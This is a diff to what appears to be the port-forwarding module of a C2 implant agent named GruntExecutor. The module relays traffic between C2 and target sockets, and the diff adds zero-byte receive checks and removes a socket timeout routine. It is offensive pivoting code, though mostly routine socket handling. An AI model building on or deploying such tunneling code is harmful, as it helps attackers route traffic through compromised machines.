@@ -28,6 +28,7 @@ namespace GruntExecutor
         {
 
             public static Dictionary<string, bool> states = new Dictionary<string, bool>();
+            public static Dictionary<string, bool> last_states = new Dictionary<string, bool>();
             public static Dictionary<string, List<Socket>> target_sockets = new Dictionary<string, List<Socket>>();
             public static Dictionary<string, List<Socket>> c2_sockets = new Dictionary<string, List<Socket>>();
             public static Dictionary<string, Thread> portfwds = new Dictionary<string, Thread>();
@@ -93,6 +94,11 @@ namespace GruntExecutor
                                     data = new byte[4];
                                     Console.WriteLine("DEBUG:: Waiting for C2 start tag ...");
                                     int i = socket.Receive(data, 4, SocketFlags.None);
+                                    if (i == 0){
+                                        Console.WriteLine("DEBUG:: This should fix FIN_WAIT ...");
+                                        break;
+                                    }
+                                    Console.WriteLine("DEBUG:: C2 start tag i: " + i);
                                     int length = BitConverter.ToInt32(data, 0);
                                     Console.WriteLine("DEBUG:: C2 start tag: " + length);
                                     byte[] body = new byte[length];
@@ -125,6 +131,10 @@ namespace GruntExecutor
                                     Console.WriteLine("DEBUG:: Waiting for data from target ...");
                                     int size_data = socket.Receive(data);
                                     Console.WriteLine("DEBUG:: data size: " + size_data);
+                                    if (size_data == 0){
+                                        Console.WriteLine("DEBUG:: This should fix FIN_WAIT ...");
+                                        break;
+                                    }
                                     bytesFromTarget.Add(new Byte_Data(data.Take(size_data).ToArray(), size_data));
 
 
@@ -135,7 +145,11 @@ namespace GruntExecutor
                         {
                             break;
                         }
+
+                        //set last_state to true
+                        last_states[bind_port] = true;
                     }
+
                     try{
                         Console.WriteLine("DEBUG:: Trying to shutdown socket ...");
                         socket.Shutdown(SocketShutdown.Both);
@@ -195,6 +209,9 @@ namespace GruntExecutor
                         {
                             break;
                         }
+
+                        //set last_state to true
+                        last_states[bind_port] = true;
                     }
                     
                     try{
@@ -216,7 +233,7 @@ namespace GruntExecutor
                 public void doChat(string bind_port, Socket sock_c2, Socket sock_route)
                 {
                     
-                    int sock_timeout = 30; //assume died after 30 ping back
+                    
                     Thread keep_reading_from_C2 = new Thread(() => asyncRead(sock_c2, 0, bind_port));
                     Thread keep_writing_to_Target = new Thread(() => asyncWrite(sock_route, 0, bind_port));
                     Thread keep_reading_from_Target = new Thread(() => asyncRead(sock_route, 1, bind_port));
@@ -298,72 +315,12 @@ namespace GruntExecutor
                                 keep_writing_to_C2 = null;
                                 break;
                                 
-                            }
+                            }//end of catch
                             
                             
                             //check with delay
                             Console.WriteLine("Ping back ...");
                             System.Threading.Thread.Sleep(2000);
-                            sock_timeout = sock_timeout -1;
-                            //check if timeout
-                            if (sock_timeout == 0){
-                                //assume died
-                                //close sock_route
-                                try{
-                                    Console.WriteLine("DEBUG:: Trying to shutdown sock_route ...");
-                                    sock_route.Shutdown(SocketShutdown.Both);
-                                    sock_route.Close();
-                                }
-                                catch (ObjectDisposedException ef){
-                                    Console.WriteLine("DEBUG:: ShutDown failed, Trying to close ...");
-                                    sock_route.Close();
-                                }
-                                catch (Exception ef){
-                                    Console.WriteLine("DEBUG:: Nothing to do ...");
-                                }
-                                //close sock_route
-                                try{
-                                    Console.WriteLine("DEBUG:: Trying to shutdown sock_c2 ...");
-                                    sock_c2.Shutdown(SocketShutdown.Both);
-                                    sock_c2.Close();
-                                }
-                                catch (ObjectDisposedException ef){
-                                    Console.WriteLine("DEBUG:: ShutDown failed, Trying to close ...");
-                                    sock_c2.Close();
-                                }
-                                catch (Exception ef){
-                                    Console.WriteLine("DEBUG:: Nothing to do ...");
-                                }
-
-                                //sock closted
-                                Console.WriteLine("DEBUG:: sock closed. Killing client thread ...");
-                                Console.WriteLine("DEBUG:: killing keep_writing_to_Target ... ");
-                                keep_writing_to_Target.Abort();
-                                Console.WriteLine("DEBUG:: joinning keep_writing_to_Target ... ");
-                                keep_writing_to_Target.Join();
-                                keep_writing_to_Target = null;
-                                
-                                Console.WriteLine("DEBUG:: killing keep_reading_from_Target ... ");
-                                keep_reading_from_Target.Abort();
-                                Console.WriteLine("DEBUG:: joinning keep_reading_from_Target ... ");
-                                keep_reading_from_Target.Join();
-                                keep_reading_from_Target = null;
-
-                                Console.WriteLine("DEBUG:: killing keep_reading_from_C2 ... ");
-                                keep_reading_from_C2.Abort();
-                                Console.WriteLine("DEBUG:: joinning keep_reading_from_C2 ... ");
-                                keep_reading_from_C2.Join();
-                                keep_reading_from_C2 = null;
-
-                                Console.WriteLine("DEBUG:: killing keep_writing_to_C2 ... ");
-                                keep_writing_to_C2.Abort();
-                                Console.WriteLine("DEBUG:: joinning keep_writing_to_C2 ... ");
-                                keep_writing_to_C2.Join();
-                                keep_writing_to_C2 = null;
-
-                                break;
-
-                            }//assume died end
 
                         }//end while
                     }//end try
